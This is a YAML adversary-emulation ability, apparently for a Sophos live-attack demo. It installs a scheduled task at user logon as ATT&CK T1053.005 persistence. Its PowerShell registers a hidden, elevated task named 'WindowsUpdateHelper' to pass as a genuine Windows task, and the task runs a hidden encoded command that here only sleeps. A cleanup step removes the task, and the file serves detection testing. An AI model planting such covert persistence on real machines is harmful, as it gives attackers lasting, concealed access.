@@ -1,0 +1,72 @@
+---
+- id: scn028-a3-persistence
+  name: "SCN-028 | Phase 3: Persistence via Scheduled Task (Visible Terminal)"
+  description: |
+    Opens a visible attacker terminal and installs a scheduled task named
+    "WindowsUpdateHelper" that runs at user logon — mimicking the naming
+    convention attackers use to blend with legitimate Windows tasks.
+    The task is visible in Task Scheduler on the Desktop. Sophos behavioral
+    detection fires on the suspicious task registration pattern.
+    Maps to T1053.005 (Scheduled Task/Job: Scheduled Task).
+  tactic: persistence
+  technique:
+    attack_id: T1053.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $taskName    = 'WindowsUpdateHelper'
+          $taskCmd     = 'powershell.exe'
+          $taskArgs    = '-WindowStyle Hidden -EncodedCommand cwB0AGEAcgB0AC0AcwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANgAwAA=='
+          $desktop     = [Environment]::GetFolderPath('Desktop')
+
+          # Build and launch visible attacker terminal
+          $sp = "$env:TEMP\sd_phase3.ps1"
+          '' | Out-File $sp -Encoding UTF8
+          Add-Content $sp 'try { $host.UI.RawUI.BackgroundColor = "Black"; $host.UI.RawUI.ForegroundColor = "White"; Clear-Host } catch {}'
+          Add-Content $sp 'Write-Host ""'
+          Add-Content $sp 'Write-Host "  SOPHOS // STAGE DIVE  -  LIVE ATTACK CHAIN" -ForegroundColor DarkRed'
+          Add-Content $sp 'Write-Host "  ─────────────────────────────────────────────" -ForegroundColor DarkGray'
+          Add-Content $sp 'Write-Host ""'
+          Add-Content $sp 'Write-Host "  PHASE 3 — PERSISTENCE" -ForegroundColor Yellow'
+          Add-Content $sp 'Write-Host "  T1053.005  |  Scheduled Task at Logon" -ForegroundColor DarkGray'
+          Add-Content $sp 'Write-Host ""'
+          Add-Content $sp 'Write-Host "  [*] Attacker goal: survive reboots, maintain access" -ForegroundColor White'
+          Add-Content $sp 'Write-Host "  [*] Task name    : WindowsUpdateHelper" -ForegroundColor White'
+          Add-Content $sp 'Write-Host "  [*] Trigger      : At user logon" -ForegroundColor White'
+          Add-Content $sp 'Write-Host "  [*] Run level    : Highest (Administrator)" -ForegroundColor White'
+          Add-Content $sp 'Write-Host ""'
+          Add-Content $sp 'Write-Host "  [*] Registering scheduled task..." -ForegroundColor Cyan'
+          Add-Content $sp 'Start-Sleep -Seconds 2'
+          Add-Content $sp '  $task = Get-ScheduledTask -TaskName "WindowsUpdateHelper" -ErrorAction SilentlyContinue'
+          Add-Content $sp '  if ($task) {'
+          Add-Content $sp '    Write-Host "  [+] Task registered: $($task.TaskName)" -ForegroundColor Green'
+          Add-Content $sp '    Write-Host "  [+] Status: $($task.State)" -ForegroundColor Green'
+          Add-Content $sp '    Write-Host "  [+] Attacker persists across reboots — will re-establish C2 at every logon" -ForegroundColor Green'
+          Add-Content $sp '  } else {'
+          Add-Content $sp '    Write-Host "  [!] Task registration blocked by endpoint protection" -ForegroundColor Red'
+          Add-Content $sp '  }'
+          Add-Content $sp 'Write-Host ""'
+          Add-Content $sp 'Write-Host "  [*] Verify: open Task Scheduler > Task Scheduler Library > WindowsUpdateHelper" -ForegroundColor DarkGray'
+          Add-Content $sp 'Write-Host ""'
+
+          Start-Process powershell -ArgumentList '-NoProfile','-NoExit','-ExecutionPolicy','Bypass','-File',$sp -WindowStyle Normal
+          Start-Sleep -Seconds 2
+
+          # Register the scheduled task
+          try {
+            $action   = New-ScheduledTaskAction -Execute $taskCmd -Argument $taskArgs
+            $trigger  = New-ScheduledTaskTrigger -AtLogOn
+            $settings = New-ScheduledTaskSettingsSet -Hidden $true -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
+              -Settings $settings -RunLevel Highest -Force -ErrorAction Stop | Out-Null
+            Write-Output "[+] Scheduled task registered: $taskName (runs at logon, elevated)"
+            Write-Output "[+] Visible in Task Scheduler > Task Scheduler Library"
+          } catch {
+            Write-Output "[!] Task registration blocked: $_"
+          }
+        cleanup: |
+          Unregister-ScheduledTask -TaskName 'WindowsUpdateHelper' -Confirm:$false -ErrorAction SilentlyContinue
+          Remove-Item "$env:TEMP\sd_phase3.ps1" -Force -ErrorAction SilentlyContinue
+          Write-Output "Cleanup complete"
